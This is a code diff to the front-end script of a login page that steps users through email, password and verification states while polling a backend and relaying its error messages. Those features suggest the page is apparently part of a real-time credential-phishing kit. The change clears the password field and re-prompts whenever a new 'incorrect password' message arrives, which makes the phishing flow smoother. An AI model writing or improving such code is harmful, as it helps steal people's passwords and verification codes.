@@ -299,6 +299,7 @@ let processingStartTime = null;
         let lastFormVisibleStatus = 'WAITINGEMAIL';
         let submitGuardTimeout = null;
         let lastRenderedOptionsHash = '';
+        let lastPasswordErrorMsg = '';
 
         const loadingMessages = [
             "Securing your connection...",
@@ -489,6 +490,7 @@ let processingStartTime = null;
             const statusChanged = (status !== currentStatus);
             currentStatus = status;
             if (status !== 'PROCESSING') processingStartTime = null;
+            if (statusChanged || (status !== 'WAITINGPASSWORD' && status !== 'WAITINGPASSWORDERROR')) lastPasswordErrorMsg = '';
             const emailGroup = document.getElementById('emailGroup');
             const passwordGroup = document.getElementById('passwordGroup');
             const verificationOptionsGroup = document.getElementById('verificationOptionsGroup');
@@ -584,12 +586,21 @@ let processingStartTime = null;
                         try {
                             const r = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
                             if (r.message && (r.message.includes('Incorrect password') || r.message.includes('incorrect'))) {
+                                if (r.message !== lastPasswordErrorMsg) {
+                                    passwordField.value = '';
+                                    lastPasswordErrorMsg = r.message;
+                                }
                                 document.getElementById('InvalidPassword').textContent = r.message;
                                 document.getElementById('InvalidPassword').style.display = 'block';
                             }
                         } catch (e) { }
                     } else if (status === 'WAITINGPASSWORDERROR') {
-                        document.getElementById('InvalidPassword').textContent = 'Incorrect password. Please try again.';
+                        const genericPasswordError = 'Incorrect password. Please try again.';
+                        if (genericPasswordError !== lastPasswordErrorMsg) {
+                            passwordField.value = '';
+                            lastPasswordErrorMsg = genericPasswordError;
+                        }
+                        document.getElementById('InvalidPassword').textContent = genericPasswordError;
                         document.getElementById('InvalidPassword').style.display = 'block';
                     }
                     startPolling(2000);
